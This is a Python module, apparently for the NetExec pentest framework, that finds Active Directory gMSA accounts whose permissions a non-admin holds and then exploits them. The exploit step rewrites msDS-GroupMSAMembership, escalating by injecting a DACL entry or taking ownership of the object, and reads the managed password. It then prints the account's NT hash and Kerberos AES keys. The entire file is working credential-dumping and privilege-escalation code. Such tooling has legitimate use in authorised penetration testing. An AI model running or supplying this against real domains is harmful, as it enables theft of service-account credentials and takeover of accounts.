import struct
import uuid as _uuid
from binascii import hexlify

from impacket.krb5 import constants
from impacket.krb5.crypto import generate_kerberos_keys
from impacket.ldap import ldaptypes
from impacket.ldap.ldap import MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError
from impacket.uuid import bin_to_string
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB

# schemaIDGUID for ms-DS-GroupMSAMembership attribute
GMSA_MEMBERSHIP_GUID = "888eedd6-ce04-df40-b462-b8a50e41ba38"

# Rights that allow directly writing msDS-GroupMSAMembership without extra steps
DIRECT_WRITE_RIGHTS = {
    "GenericAll":      0x10000000,
    "GenericWrite":    0x40000000,
    "WriteProperties": 0x00000020,
}

# Rights that allow exploitation via DACL/Owner manipulation (handled automatically in ACTION=exploit)
DACL_ABUSE_RIGHTS = {
    "WriteDACL":  0x00040000,
    "WriteOwner": 0x00080000,
}

EXPLOITABLE_RIGHTS = {**DIRECT_WRITE_RIGHTS, **DACL_ABUSE_RIGHTS}

# Trustees that legitimately have write access — skip these in find output
EXCLUDED_SID_SUFFIXES = ["-512", "-519", "-526", "-527"]  # Domain Admins, Enterprise Admins, Key Admins, Enterprise Key Admins
EXCLUDED_SIDS = {"S-1-5-18", "S-1-5-32-544", "S-1-5-32-548", "S-1-5-9", "S-1-5-10"}  # SYSTEM, Administrators, Account Operators, EDCs, Principal Self


class NXCModule:
    r"""
    Discover and exploit gMSA accounts via write rights on the gMSA object.

    Two actions:
      find    -- enumerate all gMSA objects and report non-admin trustees that
                 hold GenericAll/GenericWrite/WriteDACL/WriteOwner/WriteProperties.
                 With PRINCIPAL=<account> only results for that account are shown.
      exploit -- grant PRINCIPAL read access to TARGET's gMSA password by patching
                 msDS-GroupMSAMembership, then dump the NT hash and Kerberos keys.
                 Automatically escalates: direct write → WriteDACL (injects a
                 temporary ACE) → WriteOwner (takes ownership then patches DACL).
                 All temporary changes are restored unless RESTORE=false is set.

    Examples:
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse -o ACTION=find PRINCIPAL=<user>
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse \
        -o ACTION=exploit TARGET=<gMSA_name> PRINCIPAL=<user>
    """

    name = "gmsa_abuse"
    description = "Discover and exploit gMSA accounts via write rights on msDS-GroupMSAMembership"
    supported_protocols = ["ldap"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = "find"
        self.target_gmsa = None
        self.principal = None
        self.restore = True

    def options(self, context, module_options):
        """
        ACTION      find (default) or exploit
        TARGET      gMSA sAMAccountName to target (required for exploit)
        PRINCIPAL   Account to check/grant — for find: filter results to this
                    trustee; for exploit: the account that receives read access
                    (defaults to the authenticated user when omitted)
        RESTORE     true (default) or false — restore original msDS-GroupMSAMembership
                    after dumping (only relevant for exploit)
        """
        self.action = module_options.get("ACTION", "find").lower()
        self.target_gmsa = module_options.get("TARGET", "").strip()
        self.principal = module_options.get("PRINCIPAL", "").strip()
        self.restore = module_options.get("RESTORE", "true").lower() != "false"

        if self.action == "exploit" and not self.target_gmsa:
            context.log.fail("exploit requires TARGET=<gMSA sAMAccountName>")
            raise ValueError("TARGET required")

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        if self.action == "find":
            self._find()
        elif self.action == "exploit":
            self._exploit()
        else:
            context.log.fail(f"Unknown ACTION '{self.action}' — use 'find' or 'exploit'")

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------

    def _find(self):
        principal_sid = None
        if self.principal:
            principal_sid = self._sid_for_account(self.principal)
            if not principal_sid:
                self.context.log.fail(f"Cannot resolve principal '{self.principal}'")
                return
            self.context.log.display(f"Filtering results for principal: {self.principal} ({principal_sid})")

        gmsa_list = self.connection.search(
            searchFilter="(objectClass=msDS-GroupManagedServiceAccount)",
            attributes=["sAMAccountName", "distinguishedName", "nTSecurityDescriptor"],
            searchControls=security_descriptor_control(sdflags=0x04),
        )
        parsed = parse_result_attributes(gmsa_list)
        if not parsed:
            self.context.log.display("No gMSA accounts found in the domain")
            return

        self.context.log.display(f"Found {len(parsed)} gMSA account(s) — checking DACLs ...")
        found_any = False

        for acc in parsed:
            name = acc.get("sAMAccountName", "?")
            raw_sd = acc.get("nTSecurityDescriptor")
            if not raw_sd:
                self.context.log.debug(f"{name}: nTSecurityDescriptor not readable (no access)")
                continue

            try:
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(raw_sd))
                dacl = sd["Dacl"]
            except Exception as e:
                self.context.log.debug(f"{name}: failed to parse SD -- {e}")
                continue

            # Accumulate rights per trustee to deduplicate multiple ACEs for the same SID
            trustee_rights = {}

            for ace in dacl["Data"]:
                ace_type = ace["AceType"]
                if ace_type not in (0x00, 0x05):
                    continue

                trustee_sid = ace["Ace"]["Sid"].formatCanonical()

                if self._is_excluded_sid(trustee_sid):
                    continue

                if principal_sid and trustee_sid != principal_sid:
                    continue

                mask = ace["Ace"]["Mask"]["Mask"]

                if ace_type == 0x05:
                    # Object-specific ACE: WriteProperty (0x20) is GUID-scoped.
                    # Matching it blindly against the full mask causes false positives when
                    # the ACE targets a different attribute.  Check the GUID explicitly.
                    object_level = {k: v for k, v in EXPLOITABLE_RIGHTS.items() if k != "WriteProperties"}
                    matched_rights = [r for r, v in object_level.items() if mask & v]
                    if mask & 0x00000020:
                        obj_type = ""
                        if ace["Ace"]["ObjectTypeLen"] != 0:
                            obj_type = bin_to_string(ace["Ace"]["ObjectType"]).lower()
                        if obj_type in ("", GMSA_MEMBERSHIP_GUID):
                            matched_rights.append("WriteProperty(msDS-GroupMSAMembership)")
                else:
                    matched_rights = [r for r, v in EXPLOITABLE_RIGHTS.items() if mask & v]

                if not matched_rights:
                    continue

                existing = trustee_rights.get(trustee_sid, set())
                existing.update(matched_rights)
                trustee_rights[trustee_sid] = existing

            for trustee_sid, rights_set in trustee_rights.items():
                resolved = self._resolve_sid(trustee_sid)
                rights_str = ", ".join(sorted(rights_set))
                self.context.log.highlight(
                    f"gMSA: {name:<25} Trustee: {resolved:<30} ({trustee_sid})  Rights: {rights_str}"
                )
                self.context.log.highlight(
                    f"  -> Exploit: -M gmsa_abuse -o ACTION=exploit TARGET={name} PRINCIPAL=<account>"
                )
                found_any = True

        if not found_any:
            if principal_sid:
                self.context.log.display(f"No exploitable rights found for '{self.principal}'")
            else:
                self.context.log.display("No non-admin write rights found on any gMSA object")

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    def _exploit(self):
        # Default PRINCIPAL to the current authenticated user
        if not self.principal:
            self.principal = self.connection.username
            self.context.log.display(f"No PRINCIPAL specified — using authenticated user: {self.principal}")

        # 1. Resolve PRINCIPAL to SID
        principal_sid = self._sid_for_account(self.principal)
        if not principal_sid:
            self.context.log.fail(f"Cannot resolve PRINCIPAL '{self.principal}' — does the account exist?")
            return

        self.context.log.display(f"Principal '{self.principal}' SID: {principal_sid}")

        # 2. Locate gMSA object
        resp = self.connection.search(
            searchFilter=f"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={escape_filter_chars(self.target_gmsa)}))",
            attributes=["distinguishedName", "sAMAccountName", "msDS-GroupMSAMembership"],
        )
        parsed = parse_result_attributes(resp)
        if not parsed:
            self.context.log.fail(f"gMSA '{self.target_gmsa}' not found in LDAP")
            return

        gmsa_dn = parsed[0]["distinguishedName"]
        self.context.log.display(f"Target gMSA DN: {gmsa_dn}")

        # 3. Back up original msDS-GroupMSAMembership so we can restore it
        original_sd_bytes = None
        if "msDS-GroupMSAMembership" in parsed[0]:
            original_sd_bytes = bytes(parsed[0]["msDS-GroupMSAMembership"])
            self.context.log.debug("Original msDS-GroupMSAMembership backed up")

        # 4. Build new SD granting PRINCIPAL read access
        new_sd_bytes = self._build_membership_sd(principal_sid)

        # 5. Write msDS-GroupMSAMembership — escalates automatically if direct write is denied
        if not self._write_membership(gmsa_dn, new_sd_bytes):
            return

        # 6. Read msDS-ManagedPassword
        #    Only returned when the caller's Kerberos token is listed in msDS-GroupMSAMembership.
        #    If the current account IS the PRINCIPAL the read succeeds immediately; otherwise
        #    the user must re-authenticate as PRINCIPAL and use --gmsa.
        resp2 = self.connection.search(
            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
            attributes=["sAMAccountName", "msDS-ManagedPassword"],
        )
        parsed2 = parse_result_attributes(resp2)

        if parsed2 and "msDS-ManagedPassword" in parsed2[0]:
            try:
                rc4, aes128, aes256 = self._compute_gmsa_secrets(
                    parsed2[0]["msDS-ManagedPassword"],
                    parsed2[0]["sAMAccountName"],
                )
                self.context.log.highlight(
                    f"{self.target_gmsa}:::aad3b435b51404eeaad3b435b51404ee:{rc4}:::"
                )
                self.context.log.success(f"NT hash: {rc4}")
                self.context.log.highlight(f"aes128-cts-hmac-sha1-96: {aes128}")
                self.context.log.highlight(f"aes256-cts-hmac-sha1-96: {aes256}")
            except Exception as e:
                self.context.log.fail(f"Failed to parse msDS-ManagedPassword blob: {e}")
        else:
            self.context.log.fail(
                "msDS-ManagedPassword not returned — the current session is not running as "
                f"'{self.principal}'.  Re-authenticate as '{self.principal}' and run "
                f"'netexec ldap <DC> -u {self.principal} -p <pass> --gmsa' to retrieve the hash."
            )

        # 7. Restore original msDS-GroupMSAMembership if requested
        if self.restore and original_sd_bytes is not None:
            self.context.log.display("Restoring original msDS-GroupMSAMembership …")
            try:
                self.connection.ldap_connection.modify(
                    gmsa_dn,
                    {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, original_sd_bytes)]},
                )
                self.context.log.success("msDS-GroupMSAMembership restored to original")
            except LDAPSessionError as e:
                self.context.log.fail(f"Failed to restore msDS-GroupMSAMembership: {e} — restore manually!")
        elif self.restore and original_sd_bytes is None:
            self.context.log.display("msDS-GroupMSAMembership was absent before patching — removing added value ...")
            try:
                self.connection.ldap_connection.modify(
                    gmsa_dn,
                    {"msDS-GroupMSAMembership": [(MODIFY_DELETE, [])]},
                )
                self.context.log.success("msDS-GroupMSAMembership removed (restored to original absent state)")
            except LDAPSessionError as e:
                self.context.log.fail(f"Failed to remove msDS-GroupMSAMembership: {e} — remove manually!")
        else:
            self.context.log.display("RESTORE=false — msDS-GroupMSAMembership left patched")

    def _write_membership(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
        """Write msDS-GroupMSAMembership, escalating through WriteDACL and WriteOwner paths if denied."""
        self.context.log.display(f"Patching msDS-GroupMSAMembership to grant '{self.principal}' read access …")
        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
            )
            self.context.log.success("msDS-GroupMSAMembership patched (direct write)")
            return True
        except LDAPSessionError as e:
            err = str(e).lower()
            if not any(x in err for x in ("insufficientaccessrights", "result: 50")):
                self.context.log.fail(f"LDAP modify failed: {e}")
                return False

        self.context.log.display("Direct write denied — attempting WriteDACL path …")
        if self._exploit_via_dacl(gmsa_dn, new_sd_bytes):
            return True

        self.context.log.display("WriteDACL path failed — attempting WriteOwner path …")
        if self._exploit_via_owner(gmsa_dn, new_sd_bytes):
            return True

        self.context.log.fail(
            "All exploit paths exhausted — ensure you hold GenericAll, GenericWrite, "
            "WriteProperties, WriteDACL, or WriteOwner on the gMSA object"
        )
        return False

    def _exploit_via_dacl(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
        """Inject a temporary WriteProperty ACE via WriteDACL, write msDS-GroupMSAMembership, then restore the DACL."""
        resp = self.connection.search(
            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
            attributes=["nTSecurityDescriptor"],
            searchControls=security_descriptor_control(sdflags=0x04),
        )
        parsed = parse_result_attributes(resp)
        if not parsed or "nTSecurityDescriptor" not in parsed[0]:
            self.context.log.debug("WriteDACL path: cannot read nTSecurityDescriptor")
            return False

        original_ntsd = bytes(parsed[0]["nTSecurityDescriptor"])
        attacking_sid = self._sid_for_account(self.connection.username)
        if not attacking_sid:
            self.context.log.debug("WriteDACL path: cannot resolve own SID")
            return False

        try:
            modified_ntsd = self._inject_write_property_ace(original_ntsd, attacking_sid)
        except Exception as e:
            self.context.log.debug(f"WriteDACL path: ACE injection failed — {e}")
            return False

        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"nTSecurityDescriptor": [(MODIFY_REPLACE, modified_ntsd)]},
                controls=security_descriptor_control(sdflags=0x04),
            )
            self.context.log.success("DACL patched — WriteProperty on msDS-GroupMSAMembership injected")
        except LDAPSessionError as e:
            self.context.log.debug(f"WriteDACL path: DACL write failed — {e}")
            return False

        write_ok = False
        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
            )
            self.context.log.success("msDS-GroupMSAMembership patched via WriteDACL path")
            write_ok = True
        except LDAPSessionError as e:
            self.context.log.debug(f"WriteDACL path: membership write failed after DACL injection — {e}")

        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"nTSecurityDescriptor": [(MODIFY_REPLACE, original_ntsd)]},
                controls=security_descriptor_control(sdflags=0x04),
            )
            self.context.log.success("DACL restored to original")
        except LDAPSessionError as e:
            self.context.log.fail(f"DACL restore failed: {e} — restore manually!")

        return write_ok

    def _exploit_via_owner(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
        """Take ownership via WriteOwner, escalate to WriteDACL path, then restore the original owner."""
        resp = self.connection.search(
            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
            attributes=["nTSecurityDescriptor"],
            searchControls=security_descriptor_control(sdflags=0x01),  # OWNER_SECURITY_INFORMATION
        )
        parsed = parse_result_attributes(resp)
        if not parsed or "nTSecurityDescriptor" not in parsed[0]:
            self.context.log.debug("WriteOwner path: cannot read nTSecurityDescriptor owner")
            return False

        original_ntsd_owner = bytes(parsed[0]["nTSecurityDescriptor"])
        attacking_sid = self._sid_for_account(self.connection.username)
        if not attacking_sid:
            self.context.log.debug("WriteOwner path: cannot resolve own SID")
            return False

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=original_ntsd_owner)
            new_owner = ldaptypes.LDAP_SID()
            new_owner.fromCanonical(attacking_sid)
            sd["OwnerSid"] = new_owner
            modified_ntsd_owner = sd.getData()
        except Exception as e:
            self.context.log.debug(f"WriteOwner path: owner SD build failed — {e}")
            return False

        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"nTSecurityDescriptor": [(MODIFY_REPLACE, modified_ntsd_owner)]},
                controls=security_descriptor_control(sdflags=0x01),
            )
            self.context.log.success("Object ownership taken — proceeding with WriteDACL path")
        except LDAPSessionError as e:
            self.context.log.debug(f"WriteOwner path: ownership write failed — {e}")
            return False

        write_ok = self._exploit_via_dacl(gmsa_dn, new_sd_bytes)

        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"nTSecurityDescriptor": [(MODIFY_REPLACE, original_ntsd_owner)]},
                controls=security_descriptor_control(sdflags=0x01),
            )
            self.context.log.success("Object owner restored to original")
        except LDAPSessionError as e:
            self.context.log.fail(f"Owner restore failed: {e} — restore manually!")

        return write_ok

    def _inject_write_property_ace(self, sd_bytes: bytes, trustee_sid_str: str) -> bytes:
        """Prepend an ACCESS_ALLOWED_OBJECT_ACE granting WriteProperty on msDS-GroupMSAMembership to the existing DACL."""
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_bytes)
        dacl = sd["Dacl"]

        # Build raw ACCESS_ALLOWED_OBJECT_ACE (type 0x05):
        # AccessMask(4) + Flags(4) + ObjectType GUID(16) + SID(variable)
        access_mask = struct.pack("<I", 0x00000020)             # ADS_RIGHT_DS_WRITE_PROP
        obj_flags = struct.pack("<I", 0x00000001)               # ACE_OBJECT_TYPE_PRESENT
        guid_bytes = _uuid.UUID(GMSA_MEMBERSHIP_GUID).bytes_le  # 16 bytes, mixed-endian

        sid_obj = ldaptypes.LDAP_SID()
        sid_obj.fromCanonical(trustee_sid_str)
        sid_bytes = sid_obj.getData()

        ace_body = access_mask + obj_flags + guid_bytes + sid_bytes
        ace_size = struct.pack("<H", 4 + len(ace_body))  # 4 = AceType(1)+AceFlags(1)+AceSize(2)
        raw_ace = b"\x05\x00" + ace_size + ace_body

        existing_data = bytes(dacl["Data"])
        dacl["Data"] = raw_ace + existing_data
        dacl["AceCount"] = dacl["AceCount"] + 1
        dacl["AclSize"] = 8 + len(dacl["Data"])  # 8-byte ACL header
        sd["Dacl"] = dacl

        return sd.getData()

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _compute_gmsa_secrets(self, password_data: bytes, sam_account_name: str) -> tuple:
        """Compute RC4 (NT hash), AES128, and AES256 keys from a gMSA managed password blob."""
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(password_data)
        hex_pass = hexlify(blob["CurrentPassword"].rstrip(b"\x00")).decode()

        keys = generate_kerberos_keys(hex_pass=hex_pass, user=sam_account_name, domain=self.connection.domain)
        rc4 = hexlify(keys[constants.EncryptionTypes.rc4_hmac.value].contents).decode()
        aes128 = hexlify(keys[constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value].contents).decode()
        aes256 = hexlify(keys[constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value].contents).decode()
        return rc4, aes128, aes256

    def _build_membership_sd(self, sid_str: str) -> bytes:
        """Build a minimal security descriptor with one ACE granting FullControl to sid_str."""
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772  # SE_DACL_PRESENT | SE_SELF_RELATIVE

        owner = ldaptypes.LDAP_SID()
        owner.fromCanonical("S-1-5-18")  # SYSTEM as nominal owner
        sd["OwnerSid"] = owner
        sd["GroupSid"] = b""
        sd["Sacl"] = b""

        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0

        ace = ldaptypes.ACE()
        ace["AceType"] = 0x00  # ACCESS_ALLOWED_ACE_TYPE
        ace["AceFlags"] = 0x00

        nace = ldaptypes.ACCESS_ALLOWED_ACE()
        nace["Mask"] = ldaptypes.ACCESS_MASK()
        nace["Mask"]["Mask"] = 983551  # 0xF01FF — FullControl

        principal_sid = ldaptypes.LDAP_SID()
        principal_sid.fromCanonical(sid_str)
        nace["Sid"] = principal_sid

        ace["Ace"] = nace
        acl.aces = [ace]
        sd["Dacl"] = acl

        return sd.getData()

    def _sid_for_account(self, account: str) -> str | None:
        """Return the objectSid string for a sAMAccountName, or None."""
        try:
            resp = self.connection.search(
                searchFilter=f"(sAMAccountName={escape_filter_chars(account)})",
                attributes=["objectSid"],
            )
            parsed = parse_result_attributes(resp)
            if parsed:
                return parsed[0].get("objectSid")
        except Exception as e:
            self.context.log.debug(f"SID lookup for '{account}' failed: {e}")
        return None

    def _resolve_sid(self, sid: str) -> str:
        """Resolve a SID string to sAMAccountName via LDAP, fall back to the raw SID."""
        try:
            resp = self.connection.search(
                searchFilter=f"(objectSid={sid})",
                attributes=["sAMAccountName"],
            )
            parsed = parse_result_attributes(resp)
            if parsed:
                return parsed[0].get("sAMAccountName", sid)
        except Exception as e:
            self.context.log.debug(f"SID resolve for '{sid}' failed: {e}")
        return sid

    def _is_excluded_sid(self, sid: str) -> bool:
        if sid in EXCLUDED_SIDS:
            return True
        return any(sid.endswith(suffix) for suffix in EXCLUDED_SID_SUFFIXES)
